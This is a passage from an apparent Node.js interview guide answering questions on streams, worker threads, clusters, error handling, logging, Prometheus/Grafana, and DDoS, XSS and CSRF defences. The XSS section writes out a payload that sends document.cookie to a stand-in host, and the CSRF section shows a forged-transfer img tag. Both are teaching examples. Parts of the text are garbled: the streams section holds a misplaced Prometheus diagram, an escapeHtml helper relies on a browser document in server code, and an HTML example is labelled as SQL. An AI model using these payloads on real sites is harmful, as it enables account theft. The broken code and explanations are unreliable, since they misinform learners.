- Prevents memory overload
- Handles data that comes in chunks
- Can convert between Buffer and String

---

## 22. How does Buffer work with streams?

**Answer (Simple Explanation):**

**Buffer + Streams = A Perfect Match**

Think of it like an **assembly line** in a factory:

1. **Worker 1** (Readable Stream) reads data and puts it in a bucket (Buffer)
2. **Worker 2** (Writable Stream) takes data from the bucket and processes it
3. If Worker 2 is slow, the bucket gets full → tells Worker 1 to wait (back pressure)
4. When the bucket empties, Worker 1 continues

**Real Example:**

```javascript
const fs = require('fs');

// Read a file in chunks (with Buffer)
const readStream = fs.createReadStream('movie.mp4', {
  highWaterMark: 64 * 1024 // Each chunk is 64KB (Buffer size)
});

// Write to another location
const writeStream = fs.createWriteStream('copy-movie.mp4');

readStream.on('data', (chunk) => {
  // chunk is a Buffer object
  console.log(`Received chunk of size: ${chunk.length}`);
  
  // Each chunk (Buffer) is processed one by one
  writeStream.write(chunk);
});
```

**How They Work Together:**

```
Large File (1GB)
    ↓
[Prometheus] ← Collects metrics every few seconds
    ↓
[Data Storage] ← Stores metrics with timestamps
    ↓
[Grafana] ← Reads from Prometheus
    ↓
[Beautiful Dashboard] ← Shows visual graphs
```

**Back Pressure With Buffers:**

```javascript
readStream.on('data', (chunk) => {
  const canWrite = writeStream.write(chunk);
  
  if (!canWrite) {
    // Pause the readable stream
    readStream.pause();
  }
});

writeStream.on('drain', () => {
  // Resume the readable stream
  readStream.resume();
});
```

**Why This is Good:**

- ✅ Memory Efficient: Instead of loading 1GB into memory, only 64KB at a time
- ✅ Faster Processing: Start processing data while still downloading
- ✅ Smooth Experience: No freezing or crashing

**Simple Summary:**

Buffers act like **temporary storage containers** that work with streams to process large amounts of data smoothly without overwhelming your computer's memory.

---

## 23. What is Worker Thread in Node.js?

**Answer (Simple Explanation):**

**What is a Worker Thread?**

Normally, Node.js is **single-threaded** – it can only do one thing at a time. A Worker Thread allows you to run JavaScript code on a **separate thread** simultaneously.

**Real-Life Analogy:**

Imagine you're a cashier at a supermarket:
- **Without Worker Threads**: You handle one customer, finish, then handle the next customer (slow)
- **With Worker Threads**: You call another cashier to help → Both serve customers simultaneously (fast!)

**When Do You Need Worker Threads?**

When you have **heavy CPU-intensive tasks** that freeze the main thread:
- Complex mathematical calculations
- Image processing
- Video encoding
- Data compression
- Complex algorithms

**Simple Example:**

```javascript
const { Worker } = require('worker_threads');

// Heavy calculation function
function heavyCalculation(n) {
  let result = 0;
  for (let i = 0; i < n; i++) {
    result += i;
  }
  return result;
}

// Without Worker Thread (freezes everything)
console.log('Starting calculation...');
const result = heavyCalculation(1e9); // This blocks everything!
console.log('Result:', result);

// Your website would freeze during this time ❌
```

**Using Worker Thread:**

```javascript
const { Worker } = require('worker_threads');
const path = require('path');

// Create a worker.js file with heavy calculation
// worker.js content:
// const { parentPort } = require('worker_threads');
// function heavyCalculation(n) {
//   let result = 0;
//   for (let i = 0; i < n; i++) {
//     result += i;
//   }
//   return result;
// }
// parentPort.on('message', (n) => {
//   const result = heavyCalculation(n);
//   parentPort.postMessage(result);
// });

// Main thread
const worker = new Worker('./worker.js');

console.log('Starting calculation...');
worker.on('message', (result) => {
  console.log('Result from worker:', result);
});

// Send work to worker
worker.postMessage(1e9);

// Main thread continues to handle other requests ✅
console.log('Main thread is still responsive!');
```

**How It Works:**

```
Main Thread: Handles regular requests, user interactions
    ↓
Heavy Task Detected: "Do calculations"
    ↓
Worker Thread: Does calculations separately
    ↓
Result comes back: Worker sends result to main thread
    ↓
Main Thread: Continues handling other requests smoothly
```

**Key Points (Simple):**

- Worker Threads run JavaScript **off the main thread**
- Prevents freezing of main application
- Used for **CPU-intensive tasks**
- Communication happens via `postMessage()` (send) and `on('message')` (receive)
- Each worker has its own memory

---

## 24. Difference between Worker Thread and Child Process

**Answer (Simple Explanation):**

**Worker Thread vs Child Process - Easy Comparison:**

Think of it like managing workers in a company:

| Feature | Worker Thread | Child Process |
|---------|--------------|---------------|
| **Memory** | Shares memory with main thread | Separate memory space |
| **Speed** | Faster communication | Slower communication |
| **Isolation** | Less isolated | Highly isolated |
| **Language** | Must be JavaScript | Can be any language (Python, Node, etc.) |
| **Startup Time** | Fast | Slower |
| **Use Case** | CPU-intensive JS tasks | Running external programs |

**Real-Life Analogy:**

**Worker Thread = Hiring a colleague in your office**
- Works in same office (shared memory)
- Quick communication
- Uses same tools
- Less training needed
- Works specifically for your company

**Child Process = Hiring a contractor from outside**
- Works in separate office (separate memory)
- Communication via emails/messages (slower)
- Brings own tools
- Can do any type of work (not just your specialty)
- More independent

**Visual Comparison:**

```
WORKER THREAD:
┌─────────────────────────────────────┐
│      Main Process Memory Space      │
│  ┌─────────────┐  ┌──────────────┐  │
│  │ Main Thread │  │ Worker Thread│  │ Shared Memory
│  └─────────────┘  └──────────────┘  │
└─────────────────────────────────────┘
         Fast communication (same memory)


CHILD PROCESS:
┌──────────────────┐    ┌──────────────────┐
│  Main Process    │    │  Child Process   │
│  Memory Space    │    │  Memory Space    │
│  ┌────────────┐  │    │  ┌────────────┐  │
│  │   Data     │  │    │  │   Data     │  │
│  └────────────┘  │    │  └────────────┘  │
└──────────────────┘    └──────────────────┘
    Separate memory, slower communication
```

**When to Use What:**

**Use Worker Thread when:**
- Need to do heavy JavaScript calculations
- Want fast communication with main thread
- Need to share memory
- Example: Image processing, data analysis

**Use Child Process when:**
- Need to run external programs (Python script, shell commands)
- Need complete isolation for safety
- Running multiple Node.js applications
- Example: Running Python scripts, system commands

**Simple Code Example:**

```javascript
// Worker Thread - for JS heavy work
const { Worker } = require('worker_threads');
const worker = new Worker('./heavy-calculation.js');
worker.postMessage(1e9);

// Child Process - for external programs
const { spawn } = require('child_process');
const python = spawn('python', ['script.py']);
python.stdout.on('data', (data) => {
  console.log(`Output: ${data}`);
});
```

**Key Takeaway:**

- **Worker Thread** = Fast, for JavaScript, shared memory
- **Child Process** = Slower, flexible, separate memory, can run any language

---

## 25. Difference between Cluster and Worker Thread

**Answer (Simple Explanation):**

**Cluster vs Worker Thread - Which One to Use?**

Let me explain with a restaurant analogy:

| Feature | Cluster | Worker Thread |
|---------|---------|---------------|
| **Purpose** | Load balancing across multiple processes | Offload heavy tasks |
| **Processes** | Multiple Node.js instances | Threads within same process |
| **Memory** | Each instance has own memory | Share memory |
| **CPU Cores** | Utilize multiple CPU cores | Utilize single core |
| **Best For** | Handling many requests | Heavy CPU tasks |

**Real-Life Restaurant Analogy:**

**Cluster = Multiple Restaurants**
```
Customer requests come in
    ↓
Request 1 → Restaurant A
Request 2 → Restaurant B
Request 3 → Restaurant C
Request 4 → Restaurant A (available)
    ↓
All customers served faster!
```

Each restaurant is separate (different Node.js process).

**Worker Thread = Team Within One Restaurant**
```
Customer order: "Fry these potatoes while I make pizza"
    ↓
Main Chef: Make pizza
Side Cook (Worker): Fry potatoes simultaneously
    ↓
Both tasks done together!
```

One restaurant with multiple workers (threads).

**Visual Comparison:**

```
CLUSTER (Multiple Node.js Processes):
┌──────────────┐  ┌──────────────┐  ┌──────────────┐
│  Process 1   │  │  Process 2   │  │  Process 3   │
│  (8GB RAM)   │  │  (8GB RAM)   │  │  (8GB RAM)   │
│  ┌────────┐  │  │ ┌────────┐  │  │ ┌────────┐  │
│  │Code    │  │  │ │Code    │  │  │ │Code    │  │
│  └────────┘  │  │ └────────┘  │  │ └────────┘  │
└──────────────┘  └──────────────┘  └──────────────┘
Master Process routes requests


WORKER THREAD (Threads Within One Process):
┌────────────────────────────────────┐
│       Main Node.js Process         │
│          (8GB RAM - Shared)        │
│  ┌──────────┐  ┌──────────┐       │
│  │Main Code │  │Worker 1  │       │
│  ├──────────┤  ├──────────┤       │
│  │Worker 2  │  │Worker 3  │       │
│  └──────────┘  └──────────┘       │
└────────────────────────────────────┘
All threads share same memory and RAM
```

**When to Use What:**

**Use Cluster when:**
- Handling many concurrent client requests
- Want to utilize all CPU cores
- Example: Web server with 100 users
- Each process is independent

```javascript
const cluster = require('cluster');
const os = require('os');
const http = require('http');

if (cluster.isMaster) {
  // Create a worker for each CPU core
  for (let i = 0; i < os.cpus().length; i++) {
    cluster.fork(); // Spawn new process
  }
} else {
  http.createServer((req, res) => {
    res.end('Hello from worker ' + process.pid);
  }).listen(3000);
}
```

**Use Worker Thread when:**
- Have heavy CPU-intensive task
- Don't want to create new processes (faster)
- Want threads to share memory
- Example: Image processing, calculations

```javascript
const { Worker } = require('worker_threads');

const worker = new Worker('./heavy-task.js');
worker.postMessage({ data: 'process' });
```

**Real-World Scenario:**

```
Scenario: You're running a web server

CLUSTER APPROACH:
- 4 CPU cores available
- Create 4 Node.js processes
- Each process handles ~25 users
- Total: 100 users handled smoothly

WORKER THREAD APPROACH:
- Single Node.js process
- 1 user uploads 1GB file
- Main thread gets frozen
- Use Worker Thread to process file
- Main thread handles other 99 users smoothly
```

**Key Takeaway:**

- **Cluster** = Multiple independent Node.js processes (for handling many requests)
- **Worker Thread** = Multiple threads in same process (for heavy tasks)
- **Cluster is better** for serving many users
- **Worker Thread is better** for processor-intensive tasks

---

## 26. How to handle errors in Node.js applications in detail?

**Answer (Simple Explanation):**

**Error Handling - The Complete Guide for Beginners**

Imagine you're building a house. If something goes wrong (mistake), you need to:
1. **Catch the mistake** (error handling)
2. **Understand what went wrong** (error types)
3. **Fix it** (error recovery)
4. **Log it** (track mistakes for future learning)

**Types of Errors in Node.js:**

**1. Synchronous Errors (Immediate):**
```javascript
// ❌ This crashes immediately
try {
  const result = undefined.length; // Error!
} catch (err) {
  console.log('Caught error:', err.message);
}
```

**2. Asynchronous Errors (Delayed):**
```javascript
// ❌ Error happens later
fs.readFile('missing.txt', (err, data) => {
  if (err) {
    console.log('File not found:', err.message);
  }
});
```

**3. Promise Errors (Promise rejection):**
```javascript
// ❌ Promise rejects
Promise.reject('Something went wrong')
  .catch((err) => {
    console.log('Promise error:', err);
  });
```

**Error Handling Strategies:**

**Strategy 1: Try-Catch (for synchronous code)**

```javascript
// Simple: Wrap code in try-catch
try {
  // Code that might fail
  const sum = add(5, 3);
  console.log('Sum:', sum);
} catch (error) {
  // Handle the error
  console.log('Error occurred:', error.message);
} finally {
  // Always runs (cleanup code)
  console.log('Done!');
}
```

**Strategy 2: Callback Error Pattern (for callbacks)**

```javascript
// Convention: First parameter is error
fs.readFile('file.txt', (err, data) => {
  if (err) {
    console.log('Error:', err.message);
    return; // Exit if error
  }
  console.log('File contents:', data);
});
```

**Strategy 3: Promise .catch() (for promises)**

```javascript
// Promise rejection handling
fetchData()
  .then((data) => {
    console.log('Data:', data);
  })
  .catch((error) => {
    console.log('Promise error:', error.message);
  })
  .finally(() => {
    console.log('Done!');
  });
```

**Strategy 4: Async-Await Try-Catch (modern, cleanest)**

```javascript
// Most readable for modern Node.js
async function loadData() {
  try {
    const data = await fetchData(); // If fails, goes to catch
    console.log('Data:', data);
  } catch (error) {
    console.log('Error:', error.message);
  } finally {
    console.log('Cleanup done');
  }
}

loadData();
```

**Strategy 5: Global Error Handlers (for uncaught errors)**

```javascript
// Catches ANY uncaught promise rejection
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
  // Send alert to admin
  sendAlertToAdmin(reason);
});

// Catches ANY uncaught exception
process.on('uncaughtException', (error) => {
  console.log('Uncaught Exception:', error);
  // Log and exit gracefully
  process.exit(1);
});
```

**Complete Error Handling Example:**

```javascript
const fs = require('fs').promises; // Promise-based

async function processFile() {
  try {
    // Step 1: Read file
    const data = await fs.readFile('data.txt', 'utf8');
    
    // Step 2: Parse data
    const json = JSON.parse(data);
    
    // Step 3: Process data
    const result = json.value * 2;
    
    // Step 4: Write result
    await fs.writeFile('result.txt', result);
    
    console.log('Success!');
  } catch (error) {
    // One catch for all errors above
    console.log('Error details:');
    console.log('  Message:', error.message);
    console.log('  Code:', error.code); // e.g., 'ENOENT' for file not found
    console.log('  Stack:', error.stack);
    
    // Respond to different error types
    if (error.code === 'ENOENT') {
      console.log('File not found');
    } else if (error instanceof SyntaxError) {
      console.log('Invalid JSON');
    } else {
      console.log('Unknown error');
    }
  } finally {
    console.log('Cleanup code here');
  }
}

processFile();
```

**Error Handling in Express (Web Framework):**

```javascript
const express = require('express');
const app = express();

// Route handler with error handling
app.get('/users/:id', async (req, res) => {
  try {
    const user = await getUser(req.params.id);
    res.json(user);
  } catch (error) {
    // Send error response to client
    res.status(500).json({ error: error.message });
  }
});

// Global error handler (catches all errors)
app.use((err, req, res, next) => {
  console.log('Error:', err);
  res.status(500).json({ error: 'Server error' });
});

app.listen(3000);
```

**Best Practices (Simple):**

1. ✅ **Always handle promises**: `.catch()` or `try-catch`
2. ✅ **Use async-await**: Cleaner than callbacks
3. ✅ **Log errors**: Know what went wrong
4. ✅ **Differentiate error types**: Handle differently based on error
5. ✅ **Set global handlers**: Catch unexpected errors
6. ✅ **Respond to user**: Tell user something went wrong
7. ✅ **Alert admin**: Send notifications for critical errors

**Error Handling Flow (Simple):**

```
Error Occurs
    ↓
Is it caught by try-catch? → YES → Handle in catch block
    ↓ NO
Is it caught by .catch()? → YES → Handle in catch
    ↓ NO
Is it caught by global handler? → YES → Log and respond
    ↓ NO
💥 Application crashes!
```

---

## 27. What is logging and why is it important in Node.js applications?

**Answer (Simple Explanation):**

**What is Logging?**

Logging is like keeping a diary or record book for your application. It notes down important events, errors, and information about the application's operation.

**Why is Logging Important?**

1. **Debugging**: Helps find and fix errors. If something goes wrong, logs show what happened leading up to the error.
2. **Monitoring**: Keeps track of the application's health and performance. Are there any slow parts? Is it crashing?
3. **Audit Trail**: Provides a record of activities for security and compliance. Who accessed what data and when?
4. **Usage Analysis**: Understand how users interact with your application. Which features are popular?
5. **Error Reporting**: Automatically notify developers or admins about issues.

**Real-Life Analogy:**

Imagine you're a car driver:
- The car has a dashboard with lights and indicators.
- If the engine is too hot, a light turns on.
- If you forget to buckle your seatbelt, a beep sounds.
- These alerts help you drive safely and avoid accidents.

**In a similar way, logging helps developers:**
- Get alerts about issues
- Understand what the application is doing
- Ensure everything is running smoothly

**Basic Example:**

```javascript
// Simple logging example
console.log('Server started'); // Info
console.error('Unable to connect to database'); // Error
```

**Using a Logging Library:**

```javascript
const winston = require('winston');

// Create a logger
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'combined.log' }),
    new winston.transports.Console()
  ]
});

// Log messages
logger.info('Server started');
logger.error('Unable to connect to database');
```

**Key Points (Simple):**

- Logging = Recording events and errors
- Helps in debugging, monitoring, and analysis
- Use logging libraries for better features
- Set different log levels: info, warning, error
- Regularly check logs to keep the application healthy

---

## 28. What are the popular logging libraries in Node.js?

**Answer (Simple Explanation):**

**Top 3 Logging Libraries for Node.js:**

1. **Winston**:
   - Most popular and flexible logging library.
   - Supports multiple transports (where logs go): console, files, databases, etc.
   - Allows log rotation, formatting, and querying.
   - Example:
     ```javascript
     const winston = require('winston');
     const logger = winston.createLogger({
       transports: [
         new winston.transports.Console(),
         new winston.transports.File({ filename: 'app.log' })
       ]
     });
     logger.info('Server started');
     ```

2. **Bunyan**:
   - Simple and fast JSON logging library.
   - Logs are structured as JSON, making them easy to parse and query.
   - Comes with a CLI tool for viewing logs.
   - Example:
     ```javascript
     const bunyan = require('bunyan');
     const log = bunyan.createLogger({ name: 'myapp' });
     log.info('Server started');
     ```

3. **Morgan**:
   - HTTP request logger middleware for Node.js.
   - Works best with Express.js applications.
   - Logs details about incoming requests: method, URL, response time, etc.
   - Example:
     ```javascript
     const morgan = require('morgan');
     app.use(morgan('combined')); // Logs in Apache combined format
     ```

**Choosing the Right Library:**

- For most applications, **Winston** is recommended due to its flexibility and features.
- If you prefer structured JSON logs, go for **Bunyan**.
- For logging HTTP requests in Express apps, use **Morgan** alongside your main logger.

---

## 29. How to implement a basic logging mechanism in a Node.js application?

**Answer (Simple Explanation):**

**Creating a Simple Logging System:**

1. **Decide What to Log**:
   - Errors, important events, user activities, etc.

2. **Choose a Logging Library**:
   - For this example, we'll use **Winston**.

3. **Set Up the Logger**:
   - Configure where logs will be saved (file, console, etc.).

4. **Log Messages**:
   - Use the logger to record messages in your application code.

**Step-by-Step Implementation:**

**Step 1: Install Winston**

```bash
npm install winston
```

**Step 2: Create a Logger Configuration**

```javascript
// logger.js
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'app.log' }),
    new winston.transports.Console()
  ]
});

module.exports = logger;
```

**Step 3: Use the Logger in Your Application**

```javascript
// app.js
const logger = require('./logger');

logger.info('Application is starting');

// Simulate an error
try {
  throw new Error('Something went wrong!');
} catch (error) {
  logger.error('Error occurred: ' + error.message);
}

// Log a warning
logger.warn('This is a warning message');

// Log an HTTP request (if using Express)
app.use((req, res, next) => {
  logger.info(`Received request: ${req.method} ${req.url}`);
  next();
});
```

**Step 4: View the Logs**

- Check the `app.log` file and console output for logged messages.

**Key Points (Simple):**

- Decide what events and errors are important to log.
- Use a logging library like Winston for flexibility.
- Regularly check and maintain log files.
- Consider log rotation to manage file size.
- Use different log levels: info, warn, error, debug.

---

## 30. What is the difference between logging and monitoring?

**Answer (Simple Explanation):**

**Logging vs Monitoring - Easy Comparison:**

| Feature | Logging | Monitoring |
|---------|---------|------------|
| **Purpose** | Record events and errors | Track performance and uptime |
| **Data** | Logs details about events, errors, transactions | Metrics about performance, resource usage, availability |
| **Frequency** | Event-driven (logs when something happens) | Continuous (tracks over time) |
| **Storage** | Stored in log files or databases | Stored in time-series databases, monitoring tools |
| **Analysis** | Analyzes past events | Analyzes real-time data |
| **Alerts** | Notifies about specific events or errors | Notifies about performance issues, downtime |

**Real-Life Analogy:**

Imagine you have a car:
- The car has a dashboard with lights and indicators.
- If the engine is too hot, a light turns on.
- If you forget to buckle your seatbelt, a beep sounds.
- These alerts help you drive safely and avoid accidents.

**In a similar way:**
- Logging keeps a record of what happened in the application.
- Monitoring keeps an eye on the application's health and performance.

**When to Use What:**

- Use **logging** to:
  - Debug issues
  - Keep track of important events
  - Maintain an audit trail

- Use **monitoring** to:
  - Ensure the application is running smoothly
  - Get alerted about potential issues before they become critical
  - Analyze performance trends over time

**Example Scenario:**

Imagine you're managing a web application:

- **Logging**:
  - Logs every user login and logout
  - Records errors when accessing the database
  - Notes when a file is uploaded or downloaded

- **Monitoring**:
  - Tracks the number of active users in real-time
  - Measures the response time of each request
  - Alerts if the CPU usage goes above 80% for more than 5 minutes

**Key Takeaway:**

- **Logging** = Recording detailed information about events and errors
- **Monitoring** = Tracking performance and health metrics in real-time
- Both are essential for maintaining a reliable, high-performing application.

---

## 31. How to do profiling and monitoring in a Node.js application?

**Answer (Simple Explanation):**

**What is Profiling and Monitoring?**

Think of it like health checkups for your application:
- **Profiling** = Detailed health examination (like visiting a doctor for blood tests)
- **Monitoring** = Regular health tracking (like checking your blood pressure at home)

**Why Do We Need Profiling?**

Imagine your web application is slow. You need to know:
- Which part of the code is slow?
- How much memory is being used?
- How many requests can it handle?
- Is the CPU working too hard?

**Profiling answers these questions.**

**What to Monitor (Key Metrics):**

1. **CPU Usage**: How hard is the processor working? (Should be < 80%)
2. **Memory Usage**: How much RAM is being used? (Should not keep growing)
3. **Response Time**: How fast does the application respond? (Should be < 200ms)
4. **Request Rate**: How many requests per second? (Helps identify bottlenecks)
5. **Error Rate**: How many requests fail? (Should be close to 0%)
6. **Uptime**: Is the application always running?

**Simple Profiling Example:**

```javascript
// Measure how long a function takes
const start = Date.now();

// Do some work
function heavyTask() {
  let sum = 0;
  for (let i = 0; i < 1e8; i++) {
    sum += i;
  }
  return sum;
}

const result = heavyTask();
const end = Date.now();

console.log(`Task took ${end - start}ms`); // Tells you how long it took
```

**Built-in Node.js Profiling Tools:**

1. **Chrome DevTools**:
   - Run your app with: `node --inspect app.js`
   - Open `chrome://inspect` in Chrome
   - See CPU, memory, and function calls

2. **Clinic.js**:
   - Easy-to-use profiling tool
   - Generates visual reports about bottlenecks

**Simple Monitoring Example:**

```javascript
// Check memory usage every minute
setInterval(() => {
  const memUsage = process.memoryUsage();
  console.log('Memory usage (MB):', {
    rss: (memUsage.rss / 1024 / 1024).toFixed(2),
    heapUsed: (memUsage.heapUsed / 1024 / 1024).toFixed(2)
  });
}, 60000); // Every 60 seconds
```

**Best Practices (Simple):**

- Profile your application regularly to identify bottlenecks.
- Monitor key metrics in production.
- Set up alerts for critical issues (high memory, slow response times).
- Keep logs of metrics to track performance over time.

---

## 32. What is Grafana and Prometheus? How do they work together?

**Answer (Simple Explanation):**

**What is Prometheus?**

Prometheus is like a **security camera for your application**. It:
- Records metrics about your application (CPU, memory, requests, etc.)
- Stores this data with timestamps
- Collects data continuously from your application
- Allows you to query this data later

**What is Grafana?**

Grafana is like a **TV screen that displays the security camera footage**. It:
- Reads data from Prometheus
- Creates beautiful visual charts and graphs
- Shows dashboards with real-time data
- Makes it easy to understand application performance

**Real-Life Analogy:**

Imagine managing a restaurant:
- **Prometheus** is like the chef taking notes: "At 12:00 PM, we served 50 customers. At 1:00 PM, 100 customers. Kitchen was busy."
- **Grafana** is like a manager looking at charts: "I see a graph showing customer traffic. I can visually see when we're busiest."

**How They Work Together:**

```
Your Application
    ↓
[Prometheus] ← Collects metrics every few seconds
    ↓
[Data Storage] ← Stores metrics with timestamps
    ↓
[Grafana] ← Reads from Prometheus
    ↓
[Beautiful Dashboard] ← Shows visual graphs
```

**Simple Setup Example:**

**Step 1: Application exposes metrics (Prometheus format)**

```javascript
// app.js
const prometheus = require('prom-client');

// Create a metric (counter)
const httpRequestsTotal = new prometheus.Counter({
  name: 'http_requests_total',
  help: 'Total HTTP requests',
  labelNames: ['method', 'route']
});

// Increment counter when request comes
app.get('/users', (req, res) => {
  httpRequestsTotal.labels('GET', '/users').inc();
  res.json({ users: [] });
});

// Expose metrics endpoint
app.get('/metrics', (req, res) => {
  res.set('Content-Type', prometheus.register.contentType);
  res.end(prometheus.register.metrics());
});
```

**Step 2: Prometheus scrapes metrics**

```yaml
# prometheus.yml - Configuration file
global:
  scrape_interval: 15s # Collect metrics every 15 seconds

scrape_configs:
  - job_name: 'nodejs-app'
    static_configs:
      - targets: ['localhost:3000'] # Your app's metrics endpoint
```

**Step 3: Grafana displays metrics**

- Grafana connects to Prometheus
- Creates dashboards showing graphs
- Shows real-time metrics

**Key Metrics to Monitor:**

1. **Request Count**: How many requests per second
2. **Response Time**: How long each request takes
3. **Error Rate**: How many requests fail
4. **Memory Usage**: How much RAM is used
5. **CPU Usage**: How much processor power is used

**Visual Dashboard Example:**

```
┌─────────────────────────────────┐
│  Application Performance (Now)  │
├─────────────────────────────────┤
│ Requests/sec: 150               │
│ Avg Response Time: 45ms         │
│ Error Rate: 0.2%                │
│ Memory: 250MB / 512MB           │
│ CPU: 35%                        │
└─────────────────────────────────┘
```

**Benefits of Using Prometheus + Grafana:**

- ✅ See application health in real-time
- ✅ Identify performance issues quickly
- ✅ Historical data for analysis
- ✅ Set up alerts for problems
- ✅ Beautiful, easy-to-understand dashboards

**Key Takeaway:**

- **Prometheus** = Data collector (records metrics)
- **Grafana** = Data visualizer (shows beautiful dashboards)
- Together they help you understand and monitor your application's health

---

## 33. What is DDoS attack? How to secure a Node.js application from it?

**Answer (Simple Explanation):**

**What is a DDoS Attack?**

DDoS stands for **Distributed Denial of Service**.

Think of it like a restaurant:
- **Normal day**: Customers come in, order food, eat, leave. Everyone is happy.
- **DDoS attack**: 10,000 people suddenly show up at once, stand in the doorway, don't order anything, just block the entrance. Real customers can't get in. The restaurant can't serve anyone.

In technical terms:
- Hackers send thousands of fake requests to your server at the same time.
- Your server gets overwhelmed and crashes.
- Real users can't access your application.

**Real-Life Impact:**

- Website becomes slow or unreachable
- Customers can't use your service
- Loss of money and reputation
- Data might be corrupted

**How to Protect Your Application:**

**1. Rate Limiting (Limit requests per user)**

```javascript
const rateLimit = require('express-rate-limit');

// Allow max 100 requests per 15 minutes from one IP
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});

// Apply to all routes
app.use(limiter);
```

**2. Use a WAF (Web Application Firewall)**

A firewall that blocks suspicious traffic automatically:
```
Real users → [Firewall checks] → Legitimate requests pass
Hackers → [Firewall blocks] → Blocked!
```

**3. Load Balancing**

Distribute traffic across multiple servers:
```
1000 requests come in
    ↓
[Load Balancer]
    ↓ ↓ ↓
Server 1  Server 2  Server 3
250       250       250  (distributed)
```

**4. Content Delivery Network (CDN)**

Use a service like Cloudflare to absorb attacks:
```
Attacker sends 1 million requests
    ↓
[Cloudflare CDN] ← Absorbs the attack
    ↓
Your server ← Receives only legitimate requests
```

**5. Monitor and Alert**

```javascript
// Alert if requests spike suddenly
if (requestsPerSecond > 1000) {
  sendAlertToAdmin('DDoS attack detected!');
  // Activate additional protection
}
```

**Complete Protection Strategy:**

```javascript
const express = require('express');
const rateLimit = require('express-rate-limit');
const app = express();

// Strict rate limiting
const strictLimiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minute
  max: 50 // Only 50 requests per minute from one IP
});

// Apply to sensitive endpoints
app.post('/login', strictLimiter, (req, res) => {
  // Handle login
});

app.get('/api/data', strictLimiter, (req, res) => {
  // Handle API requests
});

// Monitor requests
let requestCount = 0;
app.use((req, res, next) => {
  requestCount++;
  
  if (requestCount > 10000) { // Too many requests
    return res.status(503).json({ error: 'Service Unavailable' });
  }
  
  next();
});
```

**Best Practices (Simple):**

- Use rate limiting on all endpoints
- Monitor traffic patterns
- Use a CDN or firewall service
- Set up alerts for traffic spikes
- Have a response plan if attacked
- Keep your software updated

**Key Takeaway:**

- **DDoS Attack** = Flooding with fake requests to crash the server
- **Protection** = Rate limiting, WAF, load balancing, CDN, monitoring
- Multiple layers of defense are best
- Always assume user input is malicious

---

## 34. What is XSS (Cross-Site Scripting) attack? How to secure against it?

**Answer (Simple Explanation):**

**What is XSS Attack?**

XSS stands for **Cross-Site Scripting**.

Think of it like this:
- You visit a website (Website A)
- A hacker has injected malicious code into the website
- This code steals your login information, passwords, or personal data
- The hacker gets your information without you knowing

**Real Example:**

```
Attacker posts a comment on a forum:
"Check out this link: <img src=x onerror='fetch(\"http://hacker.com?cookie=\" + document.cookie)'>"

When someone views the comment:
- The malicious code runs
- It sends their login cookies to the hacker
- The hacker now has their account access!
```

**Types of XSS:**

1. **Stored XSS**: Malicious code is saved in the database
2. **Reflected XSS**: Malicious code is in the URL
3. **DOM-based XSS**: Malicious code manipulates the webpage structure

**How to Protect Your Application:**

**1. Never Trust User Input (Always Sanitize)**

```javascript
// ❌ DANGEROUS - User input directly in SQL
app.get('/greet', (req, res) => {
  const name = req.query.name;
  res.send(`<h1>Hello ${name}</h1>`); // User could inject code here
});

// Example attack: /greet?name=<script>alert('Hacked!')</script>

// ✅ SAFE - Use a sanitizer
const sanitizer = require('xss');

app.get('/greet', (req, res) => {
  const name = req.query.name;
  const cleanName = sanitizer(name); // Remove malicious code
  res.send(`<h1>Hello ${cleanName}</h1>`);
});
```

**2. Use Express Helmet (Security headers)**

```javascript
const helmet = require('helmet');
const express = require('express');
const app = express();

// Helmet sets security headers automatically
app.use(helmet());

// This prevents many types of attacks
```

**3. Escape Output**

```javascript
// ❌ DANGEROUS
res.send(`<p>${userInput}</p>`);

// ✅ SAFE - Escape special characters
const escapeHtml = (text) => {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
};

res.send(`<p>${escapeHtml(userInput)}</p>`);
```

**4. Use Content Security Policy (CSP)**

```javascript
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"], // Only allow from same origin
    scriptSrc: ["'self'"],  // Only allow own scripts
    styleSrc: ["'self'"]    // Only allow own styles
  }
}));
```

**5. Validate and Whitelist**

```javascript
// ❌ Accept anything
app.post('/profile', (req, res) => {
  const bio = req.body.bio;
  // Save bio to database
});

// ✅ Accept only specific HTML tags
const allowedTags = ['b', 'i', 'em', 'strong'];
const cleanBio = sanitizer(req.body.bio, { allowedTags });
// Save clean bio
```

**Complete Example:**

```javascript
const express = require('express');
const helmet = require('helmet');
const sanitizer = require('xss');
const app = express();

// Security middleware
app.use(helmet());

// Sanitize all user inputs
app.use(express.json());
app.use((req, res, next) => {
  if (req.body) {
    for (let key in req.body) {
      if (typeof req.body[key] === 'string') {
        req.body[key] = sanitizer(req.body[key]);
      }
    }
  }
  next();
});

// Safe endpoint
app.post('/comment', (req, res) => {
  const comment = req.body.comment; // Already sanitized
  // Save to database
  res.json({ success: true });
});
```

**Best Practices (Simple):**

- Never trust user input
- Always sanitize/escape data
- Use helmet for security headers
- Use Content Security Policy
- Keep libraries updated
- Test for vulnerabilities

**Key Takeaway:**

- **XSS Attack** = Injecting malicious code to steal user data
- **Protection** = Sanitize input, escape output, use security headers
- Treat all user input as potentially dangerous

---

## 35. What is CSRF (Cross-Site Request Forgery) attack? How to protect against it?

**Answer (Simple Explanation):**

**What is CSRF Attack?**

CSRF stands for **Cross-Site Request Forgery**.

Think of it like this:
- You're logged into your bank website
- You receive an email with a link to "check your account"
- You click the link (without closing the bank website)
- The link performs an action (like transferring money) **without your knowledge**
- The attacker steals your money!

**How CSRF Works:**

```
Step 1: You log into your bank (www.bank.com)
        Session cookie is stored in your browser

Step 2: You visit a malicious website (www.hacker.com)

Step 3: The malicious website has hidden code:
        <img src="https://bank.com/transfer?to=hacker&amount=1000">

Step 4: Your browser automatically includes your bank cookie
        Bank thinks: "This request has valid login cookie, must be real!"

Step 5: Money is transferred to the hacker!
```

**Key Difference from XSS:**
- **XSS** = Attacker runs code on your computer
- **CSRF** = Attacker tricks your computer into making requests

**How to Protect Your Application:**

**1. Use CSRF Tokens**

Every form includes a unique token. The server checks if the token is valid before processing the request.

```javascript
